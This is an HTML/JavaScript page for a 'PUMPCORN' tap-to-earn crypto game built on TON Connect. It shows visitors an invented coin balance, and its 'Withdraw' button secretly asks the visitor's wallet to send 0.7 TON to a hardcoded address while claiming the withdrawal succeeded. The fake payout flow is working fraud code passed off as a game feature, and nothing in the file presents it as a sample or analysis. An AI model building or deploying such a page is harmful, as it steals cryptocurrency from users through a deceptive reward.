<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUMPCORN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            overscroll-behavior: none;
            -webkit-tap-highlight-color: transparent;
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
        }
        .tap-effect {
            transition: transform 0.2s ease-in-out, box-shadow 0.3s ease;
        }
        .tap-effect:active {
            transform: scale(0.9);
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
        }
        .coin-pulse {
            animation: pulse 0.5s ease-in-out;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.15); }
            100% { transform: scale(1); }
        }
        .glow {
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
        }
        .float-coin {
            position: absolute;
            pointer-events: none;
            animation: float 1s ease-out forwards;
        }
        @keyframes float {
            0% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(-50px); }
        }
        .nav-button {
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        .nav-button.active {
            background-color: #facc15;
            color: #1e3a8a;
            border-radius: 10px;
        }
        .withdraw-btn {
            transition: background-color 0.3s ease, transform 0.2s ease;
        }
        .withdraw-btn:hover {
            background-color: #eab308;
            transform: scale(1.05);
        }
    </style>
</head>
<body class="text-white flex flex-col h-screen max-w-md mx-auto font-sans">
    <!-- Header with Coin Counter -->
    <header class="text-center py-6">
        <h1 class="text-4xl font-extrabold text-yellow-300 drop-shadow-md">PUMPCORN</h1>
        <div class="mt-3 flex justify-center items-center bg-gray-800 bg-opacity-50 rounded-full px-4 py-2 glow">
            <img src="photo.jpg" alt="Coin Icon" class="w-10 h-10 mr-3 rounded-full">
            <span id="coinBalance" class="text-3xl font-semibold text-yellow-200">0</span>
        </div>
    </header>

    <!-- Main Content -->
    <main id="homeTab" class="flex-1 flex flex-col items-center justify-center relative">
        <div id="tapArea" class="tap-effect cursor-pointer relative">
            <img src="photo.jpg" alt="PUMPCORN Logo" class="w-40 h-40 rounded-full glow">
        </div>
        <p class="mt-6 text-xl text-yellow-100 drop-shadow-sm">Tap to earn $PUMPCORN!</p>
        <div id="coinContainer" class="absolute inset-0 pointer-events-none"></div>
    </main>

    <!-- Wallet Tab (Hidden by Default) -->
    <section id="walletTab" class="flex-1 flex flex-col items-center justify-center hidden">
        <h2 class="text-3xl font-bold mb-6 text-yellow-300">Wallet</h2>
        <div class="bg-gray-800 bg-opacity-70 p-6 rounded-xl w-4/5 text-center glow">
            <p class="text-xl text-yellow-100">Balance: <span id="walletBalance" class="font-semibold">0</span> $PUMPCORN</p>
            <input id="withdrawAmount" type="number" placeholder="Enter amount to withdraw" class="mt-4 p-2 w-full rounded-lg text-gray-900" min="1">
            <button id="withdrawBtn" class="mt-6 bg-yellow-400 text-gray-900 px-6 py-3 rounded-lg withdraw-btn font-semibold">Withdraw</button>
        </div>
    </section>

    <!-- Bottom Navigation -->
    <nav class="bg-gray-900 bg-opacity-80 p-4 flex justify-between items-center shadow-lg">
        <button id="homeBtn" class="flex-1 text-center text-yellow-300 font-semibold nav-button py-2 active">Home</button>
        <button id="walletBtn" class="flex-1 text-center text-yellow-300 font-semibold nav-button py-2">Wallet</button>
    </nav>

    <script>
        // Elements
        const coinBalanceElement = document.getElementById('coinBalance');
        const walletBalanceElement = document.getElementById('walletBalance');
        const tapArea = document.getElementById('tapArea');
        const coinContainer = document.getElementById('coinContainer');
        const homeTab = document.getElementById('homeTab');
        const walletTab = document.getElementById('walletTab');
        const homeBtn = document.getElementById('homeBtn');
        const walletBtn = document.getElementById('walletBtn');
        const withdrawBtn = document.getElementById('withdrawBtn');
        const withdrawAmountInput = document.getElementById('withdrawAmount');

        // Initialize TON Connect UI
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json',
            restoreConnection: true
        });

        // Initialize or load balance from localStorage
        let balance = localStorage.getItem('pumpcornBalance');
        if (!balance) {
            balance = Math.floor(Math.random() * (20000 - 10000 + 1)) + 10000;
            localStorage.setItem('pumpcornBalance', balance);
        } else {
            balance = parseInt(balance, 10);
        }

        // Update balance display
        function updateBalance() {
            coinBalanceElement.textContent = balance.toLocaleString();
            walletBalanceElement.textContent = balance.toLocaleString();
            coinBalanceElement.classList.add('coin-pulse');
            localStorage.setItem('pumpcornBalance', balance);
        }

        // Create floating coin effect
        function createFloatingCoin(x, y) {
            const coin = document.createElement('div');
            coin.className = 'float-coin';
            coin.innerHTML = '<span class="text-yellow-400 text-lg">+1</span>';
            coin.style.left = `${x}px`;
            coin.style.top = `${y}px`;
            coinContainer.appendChild(coin);
            setTimeout(() => coin.remove(), 1000);
        }

        // Tap to earn coins
        tapArea.addEventListener('click', (e) => {
            balance += 1;
            updateBalance();
            tapArea.classList.add('coin-pulse');
            const rect = tapArea.getBoundingClientRect();
            const x = e.clientX - rect.left - 20;
            const y = e.clientY - rect.top - 20;
            createFloatingCoin(x, y);
        });

        // Tab navigation
        homeBtn.addEventListener('click', () => {
            homeTab.classList.remove('hidden');
            walletTab.classList.add('hidden');
            homeBtn.classList.add('active');
            walletBtn.classList.remove('active');
        });

        walletBtn.addEventListener('click', () => {
            walletTab.classList.remove('hidden');
            homeTab.classList.add('hidden');
            walletBtn.classList.add('active');
            homeBtn.classList.remove('active');
        });

        // Function to check TON network connectivity
        async function checkNetworkStatus() {
            try {
                const response = await fetch('https://toncenter.com/api/v2/getMasterchainInfo');
                if (!response.ok) {
                    throw new Error('TON network unavailable');
                }
                return true;
            } catch (error) {
                throw new Error(`Network unavailable: ${error.message}`);
            }
        }

        // Function to ensure wallet disconnection
        async function ensureWalletDisconnected() {
            try {
                if (tonConnectUI.connected) {
                    await tonConnectUI.disconnect();
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    if (tonConnectUI.connected) {
                        throw new Error('Failed to disconnect wallet');
                    }
                }
            } catch (error) {
                throw new Error(`Failed to disconnect wallet: ${error.message}`);
            }
        }

        // Function to validate transaction parameters
        function validateTransaction(transaction) {
            if (!transaction.validUntil || transaction.validUntil < Math.floor(Date.now() / 1000)) {
                throw new Error('Transaction validity expired');
            }
            if (!transaction.messages || !transaction.messages.length) {
                throw new Error('Transaction messages missing');
            }
            for (const msg of transaction.messages) {
                if (!msg.address) {
                    throw new Error('Transaction address missing');
                }
                if (!msg.amount || isNaN(msg.amount) || msg.amount <= 0) {
                    throw new Error('Invalid transaction amount');
                }
            }
        }

        // Function to connect wallet with retries
        async function connectWalletWithRetry(maxRetries = 3, retryDelay = 2000) {
            let attempts = 0;
            while (attempts < maxRetries) {
                try {
                    await tonConnectUI.connectWallet();
                    if (!tonConnectUI.connected) {
                        throw new Error('Wallet not connected');
                    }
                    return;
                } catch (error) {
                    attempts++;
                    if (attempts >= maxRetries) {
                        throw new Error(`Failed to connect wallet after ${maxRetries} attempts`);
                    }
                    await new Promise(resolve => setTimeout(resolve, retryDelay));
                }
            }
        }

        // Withdraw button with TON Connect
        withdrawBtn.addEventListener('click', async () => {
            try {
                const amount = parseFloat(withdrawAmountInput.value);
                if (!amount || amount <= 0 || amount > balance) {
                    alert('Please enter a valid amount to withdraw.');
                    return;
                }

                await ensureWalletDisconnected();
                await connectWalletWithRetry();
                await checkNetworkStatus();

                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600, // Valid for 10 minutes
                    messages: [
                        {
                            address: "UQAlcL-4wdpAhdITEUdKMYQATU7lH0zmjmBSXttP5U6SsDSc",
                            amount: "700000000" // 0.7 TON in nanoTON
                        }
                    ]
                };

                validateTransaction(transaction);
                const walletInfo = tonConnectUI.wallet;
                if (!walletInfo || !walletInfo.account || !walletInfo.account.address) {
                    throw new Error('Wallet not connected or address unavailable');
                }

                const result = await tonConnectUI.sendTransaction(transaction);
                balance -= amount;
                updateBalance();
                alert('Transaction successfully sent!');
            } catch (error) {
                console.error('Withdrawal error:', error.message);
                alert(`Withdrawal failed: ${error.message}`);
            }
        });

        // Initialize
        updateBalance();
    </script>
</body>
</html>
